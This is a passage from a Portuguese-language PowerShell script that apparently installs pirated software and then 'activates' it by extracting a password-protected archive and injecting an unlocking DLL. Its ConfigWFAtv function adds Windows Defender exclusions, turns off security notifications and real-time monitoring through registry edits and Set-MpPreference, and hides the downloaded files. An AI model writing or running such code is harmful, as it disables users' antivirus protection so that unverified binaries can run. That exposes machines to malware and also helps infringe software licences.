                                            $pastaOriginal = Split-Path -Path $setupCompleto -Parent

                                            Remove-Item -Path $pastaOriginal -Recurse -Force

                                            if($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                                Start-Process -FilePath "$setupPath" -PassThru
                                            } else {
                                                Start-Process -FilePath "$setupPath" -PassThru -Wait
                                            }
                                
                                        } else {
                                            Write-Host ""
                                            Write-Host "      Setup de instalação do $nome_programa não encontrado..." -ForegroundColor Yellow
                                            Write-Host "      Falha na instalação do $nome_programa..." -ForegroundColor Red
                                            Write-Host ""
                                        }
                                    }

                                } else {
                                
                                    # EXE:
                                    # Incia e depois Remove o setup do instalador do programa, e aguarda sua conclusão.

                                    if($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                        Start-Process -FilePath $destino -PassThru
                                    } else {
                                        Start-Process -FilePath $destino -PassThru -Wait
                                    }
                                }

                                if($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                    
                                    # Remove o setup de instalação
                                    Remove-Item $destino -Recurse -Force
                                    
                                    Write-Host ""
                                    Write-Host "      Processo de instalação foi inicializado com suceso!" -ForegroundColor Yellow
                                    Write-Host ""
                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                    Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                    Write-Host -NoNewline "para visualizar" -ForegroundColor Yellow
                                    Write-Host -NoNewline " 'Chave Keys e/ou Dados de Login' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "do seu" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa'." -ForegroundColor Cyan
                                    Write-Host ""
                                    Write-Host ""

                                    Set-MpPreference -SubmitSamplesConsent 1

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                } else {

                                    # Incia e depois Remove o setup do instalador do programa, e aguarda sua conclusão.
                                
                                    Write-Host ""
                                    Write-Host "      Confirme se o $nome_programa foi instalado, e verifique se tudo ocorreu bem." -ForegroundColor Yellow
                                    Write-Host ""
                            
                                    $instalacao_completa = Read-Host "      Deseja verificar a instalação do $nome_programa ? (S/N)"
                            
                                    Write-Host ""

                                    if($instalacao_completa -eq 's' -or $instalacao_completa -eq 'n'){

                                        # ! Antes verifica que existe uma subpasta na pasta principal do programa.

                                        # Verifica se tem alguma subpasta na pasta principal do programa instalado, e se tem arquivos dentro dessa subpasta, bem como se na pasta
                                        # principal tem arquivos também.


                                        if (Test-Path $progam_folder) {

                                            $subfoldersProgramFolder = Get-ChildItem -Path $progam_folder -Directory 

                                            if($subfoldersProgramFolder.Count -gt 0) {
                                                $subfolderPathProgramFolder = $subfoldersProgramFolder[0].FullName
                                                $filesInSubProgramFolder = Get-ChildItem -Path $subfolderPathProgramFolder -File
                                                $filesInProgramFolder = Get-ChildItem -Path $progam_folder -File  
                                            } else {
                                                $filesInProgramFolder = Get-ChildItem -Path $progam_folder -File 
                                            }     
                                        } 


                                        # Verifica se a pasta ainda existe
                                        if (((Test-Path $progam_folder) -and $subfoldersProgramFolder.Count -ge 1 -and $filesInSubProgramFolder.Count -gt 2) -or ((Test-Path $progam_folder) -and $filesInProgramFolder.Count -ge 4)) {
                                                
                                            Write-Host "      Instalação de $nome_programa foi concluída com sucesso." -ForegroundColor Green
                                            Write-Host ""
                                        
                                            #$setupPath = Join-Path $local_default $setupEncontrado.Name
                                            # ou
                                            # $setupPath = Join-Path $local_default $nomeArquivo
                                        
                                            # Remove o setup de instalação
                                            Remove-Item $destino -Recurse -Force
                                            # Remove-Item "$setupPath" -Recurse -Force

                                            $opcao_verficar_instalacao = Read-Host "      Deseja iniciar o $nome_programa para confirmar sua instalação? (S/N)"
                                        
                                            Write-Host ""
                                                    
                                            $processesRunning = CheckProcessesRunning
                                                    
                                            $processNames = $processesRunning | ForEach-Object { $_.Name }

                                            foreach ($processName in $processNames) {
                                                $process = Get-Process -Name $processName
                                                Stop-Process -Id $process.Id -Force
                                            }

                                            if ($opcao_verficar_instalacao -eq 's') {
                                                if (Test-Path $progam_folder) {

                                                    Start-Process -FilePath $program_exe -PassThru

                                                    Start-Sleep -Seconds 10

                                                    Write-Host ""
                                                    Write-Host -NoNewline "      Aguardando o processo do" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                                    Write-Host -NoNewline "ser finalizado..." -ForegroundColor Yellow
                                                    Write-Host ""

                                                    function showAfterStartProgram {

                                                        if ($MetodoSelecionado -eq "Chave/Serial") {
                                                        
                                                            #Stop-Process -Id $process.Id

                                                            Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                                            Write-Host ""
                                                            Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                                            Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                                            Write-Host -NoNewline "para visualizar" -ForegroundColor Yellow
                                                            Write-Host -NoNewline " 'Chave Keys e/ou Dados de Login' " -ForegroundColor Cyan
                                                            Write-Host -NoNewline "do seu" -ForegroundColor Yellow
                                                            Write-Host -NoNewline " '$nome_programa'." -ForegroundColor Cyan
                                                            Write-Host ""
                                                            Write-Host ""

                                                            Set-MpPreference -SubmitSamplesConsent 1

                                                        } else {
                                                         
                                                            #Stop-Process -Id $process.Id

                                                            Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow 
                                                            Write-Host ""
                                                            Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                                            Write-Host -NoNewline " 'ATIVAÇÃO' " -ForegroundColor Magenta
                                                            Write-Host -NoNewline "para ativar seu" -ForegroundColor Yellow
                                                            Write-Host -NoNewline " '$nome_programa'" -ForegroundColor Cyan
                                                            Write-Host ""
                                                            Write-Host ""

                                                            Set-MpPreference -SubmitSamplesConsent 1

                                                        }

                                                        if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                                
                                                    }
                                               
                                                    # $process = Get-Process -Name "DriverBooster" -ErrorAction SilentlyContinue

                                                    $processesRunning = CheckProcessesRunning
                                                    
                                                    $processNames = $processesRunning | ForEach-Object { $_.Name }

                                                    foreach ($processName in $processNames) {

                                                        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue

                                                        if ($process) {
                                                    
                                                            $process.WaitForExit()
                                                            showAfterStartProgram
                                                        
                                                        } else {
                                                            Write-Host ""
                                                            Write-Host -NoNewline "      Processo do" -ForegroundColor Red
                                                            Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                                            Write-Host -NoNewline "não encontrado, ou não está em execução." -ForegroundColor Red
                                                            Write-Host ""
                                                            Write-Host ""

                                                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                                        } 
                                                    }
                                        
                                                } else {

                                                    Write-Host ""
                                                    Write-Host "      A instalação falhou ou não foi concluída corretamente." -ForegroundColor Red
                                                    Write-Host ""

                                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                                }

                                            } else {

                                                if ($MetodoSelecionado -eq "Chave/Serial") {

                                                    Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                                    Write-Host ""
                                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                                    Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                                    Write-Host -NoNewline "para visualizar" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " 'Chave Keys e/ou Dados de Login' " -ForegroundColor Cyan
                                                    Write-Host -NoNewline "do seu" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$nome_programa'." -ForegroundColor Cyan
                                                    Write-Host ""
                                                    Write-Host ""


                                                    Set-MpPreference -SubmitSamplesConsent 1

                                                } else {

                                                    Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow 
                                                    Write-Host ""
                                                    Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                                    Write-Host -NoNewline " 'ATIVAÇÃO' " -ForegroundColor Magenta
                                                    Write-Host -NoNewline "para ativar seu" -ForegroundColor Yellow
                                                    Write-Host -NoNewline " '$nome_programa'" -ForegroundColor Cyan
                                                    Write-Host ""
                                                    Write-Host ""

                                                    Set-MpPreference -SubmitSamplesConsent 1

                                                }

                                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                            }

                                        } else {
                                            Write-Host "      A instalação falhou ou não foi concluída corretamente." -ForegroundColor Red
                                            write-Host -NoNewline "      Algum processo não permitido está em execução, ou o" -ForegroundColor Yellow
                                            Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                            Write-Host -NoNewline "já estava instalado no seu computador." -ForegroundColor Yellow
                                            Write-Host ""
                                            Write-Host ""

                                            # Remove o setup de instalação
                                            Remove-Item $destino -Force

                                            Set-MpPreference -SubmitSamplesConsent 1

                                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                        }

                                    } else {

                                        if ($MetodoSelecionado -eq "Chave/Serial") {

                                            Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow
                                            Write-Host ""
                                            Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                            Write-Host -NoNewline " 'VISUALIZAÇÃO' " -ForegroundColor Magenta
                                            Write-Host -NoNewline "para visualizar" -ForegroundColor Yellow
                                            Write-Host -NoNewline " 'Chave Keys e/ou Dados de Login' " -ForegroundColor Cyan
                                            Write-Host -NoNewline "do seu" -ForegroundColor Yellow
                                            Write-Host -NoNewline " '$nome_programa'." -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host ""

                                            Set-MpPreference -SubmitSamplesConsent 1

                                        } else {

                                            Write-Host "      Processo de instalação finalizado." -ForegroundColor Yellow 
                                            Write-Host ""
                                            Write-Host -NoNewline "      Inicie a etapa de" -ForegroundColor Yellow 
                                            Write-Host -NoNewline " 'ATIVAÇÃO' " -ForegroundColor Magenta
                                            Write-Host -NoNewline "para ativar seu" -ForegroundColor Yellow
                                            Write-Host -NoNewline " '$nome_programa'" -ForegroundColor Cyan
                                            Write-Host ""
                                            Write-Host ""

                                            Set-MpPreference -SubmitSamplesConsent 1

                                        }

                                        if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                    }

                                }

                            } else {

                                Write-Host ""
                                Write-Host "      O instalador de $nome_programa $versao_disponivel não foi encontrado." -ForegroundColor Red
                                Write-Host ""

                                Set-MpPreference -SubmitSamplesConsent 1

                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                            }

                        }

                    }
                                                 
                } catch {

                    Write-Host ""
                    Write-Host "      Erro ao baixar o arquivo: $_" -ForegroundColor Red
                    Write-Host ""

                    Set-MpPreference -SubmitSamplesConsent 1

                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                }
            } else {
                Write-Host ""
                Write-Host "      Instalação cancelada." -ForegroundColor Red
                Write-Host ""

                Set-MpPreference -SubmitSamplesConsent 1

                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
            }
        }

    }

    function AtivarPrograma {

        param(
            [bool]$EtapaInstAtv
        )
        
        # Declaração de Funções Fundamentais

        ## Etapa Inicial de Ativação:
        function etapaOneAtv {

            # Verificar se o arquivo foi baixado com sucesso

            $processesRunning = CheckProcessesRunning

            $processNames = $processesRunning | ForEach-Object { $_.Name }

            foreach ($processName in $processNames) {
                $process = Get-Process -Name $processName
                Stop-Process -Id $process.Id -Force
            }

            if ($MetodoSelecionado -eq "Chave/Serial") {

                if($processesRunning){

                    Write-Host "     ================================================================================================================" -ForegroundColor Green

                } else {

                    Write-Host "     ================================================================================================================" -ForegroundColor Green
                }

            } else {

                if($processesRunning){

                    Write-Host "     ================================================================================================================" -ForegroundColor Green
                    Write-Host -NoNewline "     * 1 - " -ForegroundColor Cyan                                                                   
                    Write-Host -NoNewline "Encerrando processos necessários para ativação..." -ForegroundColor Yellow
                    Write-Host -NoNewline " [10%]" -ForegroundColor Green

                } else {
                    Write-Host "     ================================================================================================================" -ForegroundColor Green
                    Write-Host -NoNewline "     * 1 - " -ForegroundColor Cyan                                                                   
                    Write-Host -NoNewline "Processos conflitantes já encerrados e dispositivo pronto para ativação..." -ForegroundColor Yellow
                    Write-Host -NoNewline " [10%]" -ForegroundColor Green
                }
            
                Write-Host ""
                Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                Write-Host -NoNewline "     * 2 - " -ForegroundColor Cyan
                Write-Host -NoNewline "Verificação dos requisitos necessários do dispositivo para iniciar ativação..." -ForegroundColor Yellow
                Write-Host -NoNewline " [20%]" -ForegroundColor Green
                Write-Host ""
                Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                Write-Host -NoNewline "     * 3 - " -ForegroundColor Cyan
                Write-Host -NoNewline "Analizando a estrutura de chaveamento exigida pelo $nome_programa..." -ForegroundColor Yellow
                Write-Host -NoNewline " [30%]" -ForegroundColor Green
            }

            # Definir o arquivo baixado e a pasta de extração como ocultos
            Set-ItemProperty -Path $destino -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

            # Verificar se o WinRAR está instalado no caminho especificado
            if (Test-Path $winrarPath) {
                                    
                # Criar o diretório de extração se não existir
                if (-not (Test-Path $extracao)) {
                    New-Item -ItemType Directory -Path $extracao | Out-Null
                }

                # Comando para extrair o arquivo usando WinRAR

                $senha = "dropsoftbr"  # Substitua pela senha real do arquivo RAR
                $arguments = "x -y `"$destino`" `"$extracao`" -p$senha"
                Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait -WindowStyle Hidden
                
                if ($MetodoSelecionado -eq "Chave/Serial") {
                    Write-Host ""
                } else {
                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                    Write-Host -NoNewline "     * 4 - " -ForegroundColor Cyan                                                                   
                    Write-Host -NoNewline "Gerando e verificando chaveamento no dispositivo..." -ForegroundColor Yellow
                    Write-Host -NoNewline " [40%]" -ForegroundColor Green
                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                    Write-Host -NoNewline "     * 5 - " -ForegroundColor Cyan
                    Write-Host -NoNewline "Reformulando e estabelecendo conexão com novo registro do windows relacionado ao $nome_programa..." -ForegroundColor Yellow
                    Write-Host -NoNewline " [50%]" -ForegroundColor Green
                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                    Write-Host -NoNewline "     * 6 - " -ForegroundColor Cyan
                    Write-Host -NoNewline "Iniciando injeção da dll com desbloqueio do $nome_programa..." -ForegroundColor Yellow
                    Write-Host -NoNewline " [60%]" -ForegroundColor Green
                }                                    

            } else {

                Write-Host ""
                Write-Host ""
                Write-Host "      WinRAR não está instalado ou não está no caminho original de instalação." -ForegroundColor Red
                Write-Host "      Aguarde enquanto preparamos o ambiente de ajustes e instalação...." -ForegroundColor Yellow
                Write-Host ""
                                    
                if (-Not (Get-Command choco -ErrorAction SilentlyContinue)) {
                                        
                    Write-Host "      Chocolatey não está instalado. Instalando Chocolatey..." -ForegroundColor Green
                                        
                    # Instalar Chocolatey
                    Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
                                        
                    Write-Host "      Instalando WinRAR..." -ForegroundColor Green
                    Write-Host ""

                    # Instalar WinRAR usando Chocolatey
                    choco install winrar -y

                    if (Test-Path $winrarPath) {

                        # Criar o diretório de extração se não existir
                        if (-not (Test-Path $extracao)) {
                            New-Item -ItemType Directory -Path $extracao | Out-Null
                        }

                        # Comando para extrair o arquivo usando WinRAR
                        $senha = "dropsoftbr"  # Substitua pela senha real do arquivo RAR
                        $arguments = "x -y `"$destino`" `"$extracao`" -p$senha"
                        Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait

                        if ($MetodoSelecionado -eq "Chave/Serial") {
                            Write-Host ""
                        } else {
                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                            Write-Host -NoNewline "     * 4 - " -ForegroundColor Cyan                                                                   
                            Write-Host -NoNewline "Gerando e verificando chaveamento no dispositivo..." -ForegroundColor Yellow
                            Write-Host -NoNewline " [40%]" -ForegroundColor Green
                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                            Write-Host -NoNewline "     * 5 - " -ForegroundColor Cyan
                            Write-Host -NoNewline "Reformulando e estabelecendo conexão com novo registro do windows relacionado ao $nome_programa..." -ForegroundColor Yellow
                            Write-Host -NoNewline " [50%]" -ForegroundColor Green
                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                            Write-Host -NoNewline "     * 6 - " -ForegroundColor Cyan
                            Write-Host -NoNewline "Iniciando injeção da dll com desbloqueio do $nome_programa..." -ForegroundColor Yellow
                            Write-Host -NoNewline " [60%]" -ForegroundColor Green
                        }

                    } else {

                        Write-Host ""
                        Write-Host "      O WinRAR não está instalado ou não está no caminho original de instalação." -ForegroundColor Red
                        Write-Host "      Houve algum problema durante a instalaçao do WinRAR no seu computador...." -ForegroundColor Yellow
                        Write-Host ""

                    }

                } else {

                    Write-Host "      Instalando WinRAR..." -ForegroundColor Green
                    Write-Host ""
                                        
                    # Instalar WinRAR usando Chocolatey
                    choco install winrar -y
                                        
                    if (Test-Path $winrarPath) {
                                           
                        # Criar o diretório de extração se não existir
                        if (-not (Test-Path $extracao)) {
                            New-Item -ItemType Directory -Path $extracao | Out-Null
                        }

                        # Comando para extrair o arquivo usando WinRAR
                        $senha = "dropsoftbr"  # Substitua pela senha real do arquivo RAR
                        $arguments = "x -y `"$destino`" `"$extracao`" -p$senha"
                        Start-Process -FilePath $winrarPath -ArgumentList $arguments -Wait -WindowStyle Hidden

                        if ($MetodoSelecionado -eq "Chave/Serial") {
                            Write-Host ""
                        } else {
                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                            Write-Host -NoNewline "     * 4 - " -ForegroundColor Cyan                                                                   
                            Write-Host -NoNewline "Gerando e verificando chaveamento no dispositivo..." -ForegroundColor Yellow
                            Write-Host -NoNewline " [40%]" -ForegroundColor Green
                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                            Write-Host -NoNewline "     * 5 - " -ForegroundColor Cyan
                            Write-Host -NoNewline "Reformulando e estabelecendo conexão com novo registro do windows relacionado ao $nome_programa..." -ForegroundColor Yellow
                            Write-Host -NoNewline " [50%]" -ForegroundColor Green
                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                            Write-Host -NoNewline "     * 6 - " -ForegroundColor Cyan
                            Write-Host -NoNewline "Iniciando injeção da dll com desbloqueio do $nome_programa..." -ForegroundColor Yellow
                            Write-Host -NoNewline " [60%]" -ForegroundColor Green
                        }

                    } else {

                        Write-Host ""
                        Write-Host "      O WinRAR não está instalado ou não está no caminho original de instalação." -ForegroundColor Red
                        Write-Host "      Houve algum problema durante a instalaçao do WinRAR no seu computador...." -ForegroundColor Yellow
                        Write-Host ""

                        if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                    }
                }
            }

        }

        ## Anulação e Liberação do WF para Ativação:
        function ConfigWFAtv {

            param(
                [string]$StatusConfigWF
            )

            if ($StatusConfigWF -eq "Online") {
                                     
                # Adicionar a pasta extraída à lista de exclusões do Windows Defender

                # Lista de caminhos de exclusão
                if($destino_atv -eq $destino_final) {
                    $exclusionsToAdd = @($extracao, $extracao_atv, $destino_final) # Adicione mais caminhos aqui, se necessário

                } else {
                    $exclusionsToAdd = @($extracao, $extracao_atv, $destino_atv, $destino_final) # Adicione mais caminhos aqui, se necessário
                }

                # Obtém a lista atual de exclusões
                $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                # Adiciona exclusões que não estão presentes
                foreach ($exclusion in $exclusionsToAdd) {
                    if ($currentExclusions -notcontains $exclusion) {
                        Add-MpPreference -ExclusionPath $exclusion
                    }
                }

                # Verifica e modifica o registro para desativar as notificações se a chave existir
	            if (Test-Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableNotifications' -Value 1 -Type DWord -Force
	            }

	            if (Test-Path 'HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableEnhancedNotifications' -Value 1 -Type DWord -Force
	            }

	            if (Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance') {
    		            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' -Name 'Enabled' -Value 0 -Type DWord -Force
	            }

	            # Aguarda 10 segundos
	            Start-Sleep -Seconds 10

	            # Verifica e desativa a proteção em tempo real se a chave existir
	            if (Test-Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force
	            }

	            if (Test-Path 'HKLM:\Software\Policies\Microsoft\Windows Defender') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force
	            }

	            # Desativa a proteção em tempo real usando Set-MpPreference
	            Set-MpPreference -DisableRealtimeMonitoring $true

            } else {

                # Adicionar a pasta extraída à lista de exclusões do Windows Defender

                # Lista de caminhos de exclusão a serem removidos
                $exclusionsToRemove = @($extracao, $extracao_atv) # Adicione mais caminhos aqui, se necessário

                # Obtém a lista atual de exclusões
                $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                # Remove exclusões que estão presentes na lista de exclusões
                foreach ($exclusion in $exclusionsToRemove) {
                    if ($currentExclusions -contains $exclusion) {
                        # Remove o caminho da exclusão
                        $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                    }
                }

                # Verifica e modifica o registro para desativar as notificações se a chave existir
	            if (Test-Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableNotifications' -Value 0 -Type DWord -Force
	            }

	            if (Test-Path 'HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableEnhancedNotifications' -Value 0 -Type DWord -Force
	            }

	            if (Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance') {
    		            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' -Name 'Enabled' -Value 1 -Type DWord -Force
	            }

	            # Aguarda 10 segundos
	            Start-Sleep -Seconds 10

	            # Verifica e desativa a proteção em tempo real se a chave existir
	            if (Test-Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 0 -Type DWord -Force
	            }

	            if (Test-Path 'HKLM:\Software\Policies\Microsoft\Windows Defender') {
    		            Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -Name 'DisableRealtimeMonitoring' -Value 0 -Type DWord -Force
	            }

	            # Desativa a proteção em tempo real usando Set-MpPreference
	            Set-MpPreference -DisableRealtimeMonitoring $false

            }
        }

        cls

        $produto_formatado = $nome_programa.Trim().ToUpper()
        
        if ($MetodoSelecionado -eq "Chave/Serial") {
            $fixedWidthEtapaDisponibilizacao = 120  # Largura total da linha

            # Frase a ser centralizada
            $etapaDisponibilizacaoTexto = "ETAPA DE DISPONIBILIZAÇÃO DA KEY DO $($produto_formatado)"
            $etapaDisponibilizacaoTextoLength = $etapaDisponibilizacaoTexto.Length

            # Calcula o número de espaços necessários para centralizar
            $spacesNeededEtapaDisponibilizacao = [Math]::Max(([Math]::Floor(($fixedWidthEtapaDisponibilizacao - $etapaDisponibilizacaoTextoLength) / 2)), 0)
            $spacesEtapaDisponibilizacao = " " * $spacesNeededEtapaDisponibilizacao

            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host "$spacesEtapaDisponibilizacao$etapaDisponibilizacaoTexto" -ForegroundColor Cyan
            Write-Host "     ================================================================================================================" -ForegroundColor Green
        } else {
            $fixedWidthEtapaAtivacao = 120  # Largura total da linha

            # Frase a ser centralizada
            $etapaAtivacaoTexto = "ETAPA DE ATIVAÇÃO DO $($produto_formatado)"
            $etapaAtivacaoTextoLength = $etapaAtivacaoTexto.Length

            # Calcula o número de espaços necessários para centralizar
            $spacesNeededEtapaAtivacao = [Math]::Max(([Math]::Floor(($fixedWidthEtapaAtivacao - $etapaAtivacaoTextoLength) / 2)), 0)
            $spacesEtapaAtivacao = " " * $spacesNeededEtapaAtivacao

            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host "$spacesEtapaAtivacao$etapaAtivacaoTexto" -ForegroundColor Cyan
            Write-Host "     ================================================================================================================" -ForegroundColor Green
        }

        # Lógica para ativação do programa

        # Função para verificar se os processos estão em execução

        function CheckProcessesRunning {

            foreach ($processoActivate in $processesToCheck['ativacao']) {

                $detalhes_processo_activate = $processoActivate -split ","

                $processesToCheck = @($($detalhes_processo_activate[0]), $($detalhes_processo_activate[1]), $($detalhes_processo_activate[2]), $($detalhes_processo_activate[3]), $($detalhes_processo_activate[4]))
                return Get-Process | Where-Object { $processesToCheck -contains $_.Name }   
            }
        
        }
        
        $programPath = "$($pathsToCheck['exe_instalacao'])"
        $pasta_instalacao_default = $($pathsToCheck['pasta_instalacao_default'])           
         
        $exePath_install_atual = $($pathsToCheck['exe_instalacao'])
        $exePath_install_default = [System.IO.Path]::GetFileName($exePath_install_atual)

        $exePath_install_found = Get-ChildItem -Path $pasta_instalacao_default -Recurse -Filter $exePath_install_default -ErrorAction SilentlyContinue

        # Aqui eu faço uma verificação se tem o programa instalado no computador, bem como se o indice do meu produto é 'Nenhum', na parte de pasta_ativacao ou link ativacao e se for
        # cai pro else e mostra a instrução de aplicação da chave serial e adicione sleep de 15 segundos.

        if ((Test-Path $programPath) -or ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação'))) {

            try {
                
                if ($stepsAtvToCheck["processo_ativacao"].Contains('Pós-instalação')) {
                    
                    $versionInfo = (Get-Item $programPath).VersionInfo
                    $programVersion = $versionInfo.FileVersion

                    # Verificar se $programVersion contém ',' e substituir por '.'
                    if ($programVersion -match ',') {

                        $programVersion = $programVersion -replace '\s+', ''  # Remove todos os espaços
                        $programVersion = $programVersion -replace ',', '.'

                        # Extrair os dois primeiros números da versão do programa e da versão disponível
                        $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                        $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                        # Converter a versão do programa para um formato numérico
                        $programVersionNumerica = [version]($programVersionParts -join '.')
                        $disponVersionNumerica = [Version]($disponivelParts -join '.')

                    } else {

                        # Extrair os dois primeiros números da versão do programa e da versão disponível
                        $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                        $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                        # Converter a versão do programa para um formato numérico
                        $programVersionNumerica = [version]($programVersionParts -join '.')
                        $disponVersionNumerica = [Version]($disponivelParts -join '.')

                    }
                }

                # Comparar as versões
                if ($programVersionNumerica -eq $disponVersionNumerica -or ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação'))) {

                    $folderFound = $false

                    foreach ($path in $pathsToCheck) {
                        if (Test-Path $($path['pasta_instalacao']) -PathType Container) {
                            $folderFound = $true
                            break
                        }
                    }

                    if ($folderFound -or ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação'))) {
                        
                        if ($MetodoSelecionado -eq "Chave/Serial") {

                            if ($stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                
                                Write-Host ""
                                Write-Host "     ================================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Chave key do" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa' '$versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "'habilitada' " -ForegroundColor Green 
                                Write-Host -NoNewline "para visualização." -ForegroundColor Yellow 
                                Write-Host ""
                                Write-Host "      Iniciando processo inicial de disponibilização da chave key do '$nome_programa'..." -ForegroundColor Green
                                Write-Host ""
                            
                            } else {
                                
                                Write-Host ""
                                Write-Host "     ================================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host "      A versão do programa atualmente instalado é igual a versão disponível para ativação." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
